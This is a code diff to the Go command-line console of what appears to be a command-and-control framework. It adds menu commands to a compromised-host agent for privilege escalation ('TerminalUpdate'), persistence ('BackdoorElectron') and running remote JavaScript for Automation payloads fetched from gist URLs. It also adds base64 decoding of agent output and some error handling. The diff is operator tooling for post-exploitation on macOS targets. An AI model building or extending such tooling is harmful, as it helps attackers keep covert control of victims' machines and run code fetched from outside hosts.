@@ -2,6 +2,7 @@ package cli
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -98,6 +99,10 @@ func Start(c2 string) {
 				readline.PcItemDynamic(listFiles(c2, agent)),
 			),
 			readline.PcItem("upload"),
+			readline.PcItem("osa",
+				readline.PcItem("https://gist.githubusercontent.com/grines/d16db7b7a2cd18e6c2ee09b56643d87a/raw/7487b362b022092e826b3b9d11fbb01256733110/prompt.js"),
+				readline.PcItem("https://gist.githubusercontent.com/grines/6ffe50be47c6637dc718c03fa2f23a14/raw/7b907cbc61a77355448fd4baa4623051e7ef0cad/test.js"),
+			),
 			readline.PcItem("agent",
 				readline.PcItemDynamic(listAgents(c2)),
 			),
@@ -112,6 +117,16 @@ func Start(c2 string) {
 			),
 			readline.PcItem("cp",
 				readline.PcItemDynamic(listFiles(c2, agent)),
+			),
+			readline.PcItem("privesc",
+				readline.PcItem("TerminalUpdate"),
+			),
+			readline.PcItem("persist",
+				readline.PcItem("BackdoorElectron"),
+			),
+			readline.PcItem("jxa",
+				readline.PcItem("https://gist.githubusercontent.com/grines/d16db7b7a2cd18e6c2ee09b56643d87a/raw/7487b362b022092e826b3b9d11fbb01256733110/prompt.js"),
+				readline.PcItem("https://gist.githubusercontent.com/grines/6ffe50be47c6637dc718c03fa2f23a14/raw/7b907cbc61a77355448fd4baa4623051e7ef0cad/test.js"),
 			),
 		)
 		l, err := readline.NewEx(&readline.Config{
@@ -131,7 +146,14 @@ func Start(c2 string) {
 
 		log.SetOutput(l.Stderr())
 		if agent != "Not Connected" {
-			wd := getAgentWorking(c2 + "/api/agent/" + agent)
+			wd, err := getAgentWorking(c2 + "/api/agent/" + agent)
+			if err != nil {
+				fmt.Println(err)
+				agent = "Not Connected"
+				l.SetPrompt(" <" + blue(agent) + "*> ")
+			} else {
+				l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
+			}
 			l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
 		} else {
 			l.SetPrompt(" <" + blue(agent) + "*> ")
@@ -191,9 +213,13 @@ func Start(c2 string) {
 				deadline := time.Now().Add(15 * time.Second)
 				for {
 					id, output := getOutput(c2+"/api/cmd/output/"+agent+"/"+cmdid, c2, cmdid)
+					sDec, _ := base64.StdEncoding.DecodeString(output)
 					if id == cmdid && output != "" || cmdString == "" {
-						fmt.Fprintln(os.Stderr, output)
-						wd := getAgentWorking(c2 + "/api/agent/" + agent)
+						fmt.Fprintln(os.Stderr, string(sDec))
+						wd, err := getAgentWorking(c2 + "/api/agent/" + agent)
+						if err != nil {
+							fmt.Println(err)
+						}
 						l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
 						break
 					}
@@ -209,6 +235,7 @@ func Start(c2 string) {
 			deadline := time.Now().Add(15 * time.Second)
 			for {
 				id, output := getOutput(c2+"/api/cmd/output/"+agent+"/"+cmdid, c2, cmdid)
+				sDec, _ := base64.StdEncoding.DecodeString(output)
 				if strings.Contains(output, "Location:") {
 					parts := strings.Split(output, " ")
 					path := parts[1]
@@ -217,8 +244,11 @@ func Start(c2 string) {
 					//fmt.Println("Process Download" + file)
 				}
 				if id == cmdid && output != "" || cmdString == "" {
-					fmt.Fprintln(os.Stderr, output)
-					wd := getAgentWorking(c2 + "/api/agent/" + agent)
+					fmt.Fprintln(os.Stderr, string(sDec))
+					wd, err := getAgentWorking(c2 + "/api/agent/" + agent)
+					if err != nil {
+						fmt.Println(err)
+					}
 					l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
 					break
 				}
@@ -357,9 +387,12 @@ func getOutput(url string, c2 string, cmd string) (string, string) {
 
 }
 
-func getAgentWorking(url string) string {
+func getAgentWorking(url string) (string, error) {
 
 	resp, err := http.Get(url)
+	if err != nil {
+		return "", err
+	}
 	if resp.Status == "200 OK" {
 
 		if err != nil {
@@ -382,9 +415,9 @@ func getAgentWorking(url string) string {
 
 		//fmt.Println(results.Working)
 
-		return results.Working
+		return results.Working, err
 	}
-	return "False"
+	return "", err
 
 }
 
